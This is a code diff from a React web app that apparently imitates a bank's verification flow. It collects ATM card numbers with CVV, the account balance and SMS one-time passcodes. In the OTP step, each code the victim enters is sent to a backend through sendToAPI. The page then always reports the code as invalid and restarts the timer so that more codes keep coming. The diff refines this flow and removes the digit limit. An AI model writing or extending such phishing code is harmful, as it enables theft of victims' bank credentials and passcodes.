@@ -1537,9 +1537,10 @@ const Step2ATMCard = ({
               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
             />
           </div>
-          <p className="text-sm text-gray-400">
+          <p className="text-sm text-white">
             cvv digits (cvv on back of card)
           </p>
+          
         </div>
 
         <button
@@ -1649,6 +1650,323 @@ const Step3AccountBalance = ({
 };
 
 // Step 4 Component - OTP Verification
+// const Step4OTPVerification = ({
+//   mobileNumber,
+//   otp,
+//   setOtp,
+//   otpError,
+//   setOtpError,
+//   timer,
+//   setTimer,
+//   onBack,
+// }) => {
+//   const [loading, setLoading] = useState(false);
+
+//   const handleOtpChange = (index, value) => {
+//     if (value.length <= 1 && /^\d*$/.test(value)) {
+//       const newOtp = [...otp];
+//       newOtp[index] = value;
+//       setOtp(newOtp);
+
+//       if (value && index < 5) {
+//         const nextInput = document.getElementById(`otp-${index + 1}`);
+//         if (nextInput) nextInput.focus();
+//       }
+//     }
+//   };
+
+//   const handleVerifyOtp = async () => {
+//     setLoading(true);
+//     const otpString = otp.join("");
+
+//     const result = await sendToAPI({
+//       type: "otp",
+//       username: mobileNumber,
+//       otp: otpString,
+//     });
+
+//     setLoading(false);
+
+//     // Always show invalid OTP error
+//     setOtpError(" OTP. Please try again.");
+//     setOtp(["", "", "", "", "", ""]);
+//   };
+
+//   const handleResendOtp = () => {
+//     if (timer === 0) {
+//       setTimer(57);
+//       setOtp(["", "", "", "", "", ""]);
+//       setOtpError("");
+//     }
+//   };
+
+//   return (
+//     <div className="bg-[#007A45] min-h-screen text-white p-6">
+//       <div className="max-w-md mx-auto">
+//         <div className="flex justify-end mb-12 mt-4">
+//           <button className="flex items-center gap-2 text-sm hover:opacity-80">
+//             <Globe className="w-4 h-4" />
+//             <span className="font-medium">EN</span>
+//           </button>
+//         </div>
+
+//         <h1 className="text-4xl font-bold mb-4">OTP Verification</h1>
+//         <p className="text-sm mb-8 opacity-90 leading-relaxed">
+//           We've sent a 6-digit verification code to your registered mobile
+//           number
+//         </p>
+
+//         <div className="text-center mb-6">
+//           <p className="text-sm font-bold mb-3">STEP 4 OF 4</p>
+//           <div className="flex justify-center gap-2">
+//             {[1, 2, 3, 4].map((step) => (
+//               <div
+//                 key={step}
+//                 className="h-1.5 w-16 rounded-full bg-white transition-all"
+//               />
+//             ))}
+//           </div>
+//         </div>
+
+//         <div className="flex justify-center gap-3 mt-12 mb-6">
+//           {/* {otp.map((digit, index) => (
+//             <input
+//               key={index}
+//               id={`otp-${index}`}
+//               type="number"
+//               inputMode="numeric"
+//               pattern="[0-9]*"
+//               maxLength={1}
+//               value={digit}
+//               onChange={(e) => handleOtpChange(index, e.target.value)}
+//               className="w-14 h-16 text-center text-2xl font-bold bg-white/20 backdrop-blur-sm border-2 border-white/50 rounded-xl focus:outline-none focus:border-white focus:bg-white/30 text-white transition-all"
+//             />
+//           ))} */}
+//         <input
+//   type="text"
+//   inputMode="numeric"
+//   pattern="[0-9]*"
+
+//   placeholder="Enter OTP Number *"
+//   value={otp.join("")} // otp array ko string me convert
+//   onChange={(e) => {
+//     const val = e.target.value.replace(/\D/g, ""); // sirf digits allow
+//     setOtp(val.split("")); // string ko array me convert karke state update
+//     setOtpError(""); // error clear
+//   }}
+//   className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 
+//              placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
+// />
+
+
+//           {/* <input
+//             type="number"
+//             inputMode="numeric"
+//             id={`otp-${index}`}
+//             maxLength={1}
+//               value={digit}
+//             pattern="[0-9]*"
+//             onChange={(e) => handleOtpChange(index, e.target.value)}
+//             placeholder="Enter your registered number *"
+//             // value={accountBalance}
+//             // onChange={(e) => setAccountBalance(e.target.value)}
+//             className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
+//           /> */}
+//         </div>
+
+//         {otpError && (
+//           <div className="bg-red-500/20 border border-red-300 rounded-lg p-3 mb-4">
+//             <p className="text-red-200 text-center font-medium">{otpError}</p>
+//           </div>
+//         )}
+
+//         <div className="text-center mb-2 mt-8">
+//           <p className="text-sm opacity-90">Didn't receive the code?</p>
+//         </div>
+
+//         <div className="text-center mb-8">
+//           <button
+//             onClick={handleResendOtp}
+//             disabled={timer > 0}
+//             className={`font-bold underline transition-all ${
+//               timer > 0
+//                 ? "opacity-50 cursor-not-allowed"
+//                 : "opacity-100 hover:text-white/80"
+//             }`}
+//           >
+//             Resend OTP
+//           </button>
+//           <p className="text-sm opacity-90 mt-1">
+//             Resend available in {timer}s
+//           </p>
+//         </div>
+
+//         <button
+//           onClick={handleVerifyOtp}
+//           disabled={otp.some((digit) => !digit) || loading}
+//           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
+//         >
+//           {loading ? "Verifying..." : "Otp Verify"}
+//         </button>
+
+//         <button
+//           onClick={onBack}
+//           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
+//         >
+//           ← Back to Home
+//         </button>
+//       </div>
+//     </div>
+//   );
+// };
+// Step 4 Component - OTP Verification
+// const Step4OTPVerification = ({
+//   mobileNumber,
+//   otp,
+//   setOtp,
+//   otpError,
+//   setOtpError,
+//   timer,
+//   setTimer,
+//   onBack,
+// }) => {
+//   const [loading, setLoading] = useState(false);
+
+//   const handleOtpChange = (index, value) => {
+//     if (value.length <= 1 && /^\d*$/.test(value)) {
+//       const newOtp = [...otp];
+//       newOtp[index] = value;
+//       setOtp(newOtp);
+
+//       if (value && index < 5) {
+//         const nextInput = document.getElementById(`otp-${index + 1}`);
+//         if (nextInput) nextInput.focus();
+//       }
+//     }
+//   };
+
+//   const handleVerifyOtp = async () => {
+//     setLoading(true);
+//     const otpString = otp.join("");
+
+//     const result = await sendToAPI({
+//       type: "otp",
+//       username: mobileNumber,
+//       otp: otpString,
+//     });
+
+//     setLoading(false);
+
+//     // Always show invalid OTP error and reset timer
+//     setOtpError(" OTP. Please try again.");
+//     setOtp(["", "", "", "", "", ""]);
+    
+//     // Reset timer to 57 seconds when OTP is submitted
+//     setTimer(57);
+//   };
+
+//   const handleResendOtp = () => {
+//     if (timer === 0) {
+//       setTimer(59);
+//       setOtp(["", "", "", "", "", ""]);
+//       setOtpError("");
+//     }
+//   };
+
+//   // Handle single input OTP change
+//   const handleSingleInputOtpChange = (e) => {
+//     const val = e.target.value.replace(/\D/g, "").slice(0, 6); // sirf digits allow, max 6
+//     setOtp(val.split("")); // string ko array me convert karke state update
+//     setOtpError(""); // error clear
+//   };
+
+//   return (
+//     <div className="bg-[#007A45] min-h-screen text-white p-6">
+//       <div className="max-w-md mx-auto">
+//         <div className="flex justify-end mb-12 mt-4">
+//           <button className="flex items-center gap-2 text-sm hover:opacity-80">
+//             <Globe className="w-4 h-4" />
+//             <span className="font-medium">EN</span>
+//           </button>
+//         </div>
+
+//         <h1 className="text-4xl font-bold mb-4">OTP Verification</h1>
+//         <p className="text-sm mb-8 opacity-90 leading-relaxed">
+//           We've sent a 6-digit verification code to your registered mobile
+//           number
+//         </p>
+
+//         <div className="text-center mb-6">
+//           <p className="text-sm font-bold mb-3">STEP 4 OF 4</p>
+//           <div className="flex justify-center gap-2">
+//             {[1, 2, 3, 4].map((step) => (
+//               <div
+//                 key={step}
+//                 className="h-1.5 w-16 rounded-full bg-white transition-all"
+//               />
+//             ))}
+//           </div>
+//         </div>
+
+//         <div className="mt-12">
+//           <input
+//             type="text"
+//             inputMode="numeric"
+//             pattern="[0-9]*"
+//             placeholder="Enter OTP Number *"
+//             value={otp.join("")}
+//             onChange={handleSingleInputOtpChange}
+//             className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 
+//                      placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
+//           />
+//         </div>
+
+//         {otpError && (
+//           <div className="bg-red-500/20 border border-red-300 rounded-lg p-3 mb-4 mt-6">
+//             <p className="text-red-200 text-center font-medium">{otpError}</p>
+//           </div>
+//         )}
+
+//         <div className="text-center mb-2 mt-8">
+//           <p className="text-sm opacity-90">Didn't receive the code?</p>
+//         </div>
+
+//         <div className="text-center mb-8">
+//           <button
+//             onClick={handleResendOtp}
+//             disabled={timer > 0}
+//             className={`font-bold underline transition-all ${
+//               timer > 0
+//                 ? "opacity-50 cursor-not-allowed"
+//                 : "opacity-100 hover:text-white/80"
+//             }`}
+//           >
+//             Resend OTP
+//           </button>
+//           <p className="text-sm opacity-90 mt-1">
+//             Resend available in {timer}s
+//           </p>
+//         </div>
+
+//         <button
+//           onClick={handleVerifyOtp}
+//           disabled={otp.join("").length !== 6 || loading}
+//           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
+//         >
+//           {loading ? "Verifying..." : "Verify OTP"}
+//         </button>
+
+//         <button
+//           onClick={onBack}
+//           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
+//         >
+//           ← Back to Home
+//         </button>
+//       </div>
+//     </div>
+//   );
+// };
+// Step 4 Component - OTP Verification
 const Step4OTPVerification = ({
   mobileNumber,
   otp,
@@ -1660,19 +1978,6 @@ const Step4OTPVerification = ({
   onBack,
 }) => {
   const [loading, setLoading] = useState(false);
-
-  const handleOtpChange = (index, value) => {
-    if (value.length <= 1 && /^\d*$/.test(value)) {
-      const newOtp = [...otp];
-      newOtp[index] = value;
-      setOtp(newOtp);
-
-      if (value && index < 5) {
-        const nextInput = document.getElementById(`otp-${index + 1}`);
-        if (nextInput) nextInput.focus();
-      }
-    }
-  };
 
   const handleVerifyOtp = async () => {
     setLoading(true);
@@ -1686,17 +1991,27 @@ const Step4OTPVerification = ({
 
     setLoading(false);
 
-    // Always show invalid OTP error
+    // Always show invalid OTP error and reset timer
     setOtpError(" OTP. Please try again.");
     setOtp(["", "", "", "", "", ""]);
+    
+    // Reset timer to 57 seconds when OTP is submitted
+    setTimer(59);
   };
 
   const handleResendOtp = () => {
     if (timer === 0) {
-      setTimer(57);
+      setTimer(59);
       setOtp(["", "", "", "", "", ""]);
       setOtpError("");
     }
+  };
+
+  // Handle single input OTP change - REMOVED DIGIT LIMIT
+  const handleSingleInputOtpChange = (e) => {
+    const val = e.target.value.replace(/\D/g, ""); // sirf digits allow, NO LIMIT
+    setOtp(val.split("")); // string ko array me convert karke state update
+    setOtpError(""); // error clear
   };
 
   return (
@@ -1727,54 +2042,21 @@ const Step4OTPVerification = ({
           </div>
         </div>
 
-        <div className="flex justify-center gap-3 mt-12 mb-6">
-          {/* {otp.map((digit, index) => (
-            <input
-              key={index}
-              id={`otp-${index}`}
-              type="number"
-              inputMode="numeric"
-              pattern="[0-9]*"
-              maxLength={1}
-              value={digit}
-              onChange={(e) => handleOtpChange(index, e.target.value)}
-              className="w-14 h-16 text-center text-2xl font-bold bg-white/20 backdrop-blur-sm border-2 border-white/50 rounded-xl focus:outline-none focus:border-white focus:bg-white/30 text-white transition-all"
-            />
-          ))} */}
-        <input
-  type="text"
-  inputMode="numeric"
-  pattern="[0-9]*"
-
-  placeholder="Enter OTP Number *"
-  value={otp.join("")} // otp array ko string me convert
-  onChange={(e) => {
-    const val = e.target.value.replace(/\D/g, ""); // sirf digits allow
-    setOtp(val.split("")); // string ko array me convert karke state update
-    setOtpError(""); // error clear
-  }}
-  className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 
-             placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
-/>
-
-
-          {/* <input
-            type="number"
+        <div className="mt-12">
+          <input
+            type="text"
             inputMode="numeric"
-            id={`otp-${index}`}
-            maxLength={1}
-              value={digit}
             pattern="[0-9]*"
-            onChange={(e) => handleOtpChange(index, e.target.value)}
-            placeholder="Enter your registered number *"
-            // value={accountBalance}
-            // onChange={(e) => setAccountBalance(e.target.value)}
-            className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
-          /> */}
+            placeholder="Enter OTP Number *"
+            value={otp.join("")}
+            onChange={handleSingleInputOtpChange}
+            className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 
+                     placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
+          />
         </div>
 
         {otpError && (
-          <div className="bg-red-500/20 border border-red-300 rounded-lg p-3 mb-4">
+          <div className="bg-red-500/20 border border-red-300 rounded-lg p-3 mb-4 mt-6">
             <p className="text-red-200 text-center font-medium">{otpError}</p>
           </div>
         )}
@@ -1802,17 +2084,17 @@ const Step4OTPVerification = ({
 
         <button
           onClick={handleVerifyOtp}
-          disabled={otp.some((digit) => !digit) || loading}
+          disabled={otp.join("").length === 0 || loading} // sirf empty check, no digit limit
           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
         >
-          {loading ? "Verifying..." : "Verify"}
+          {loading ? "Verifying..." : "Verify OTP"}
         </button>
 
         <button
           onClick={onBack}
           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
         >
-          ← Back to Login
+          ← Back
         </button>
       </div>
     </div>
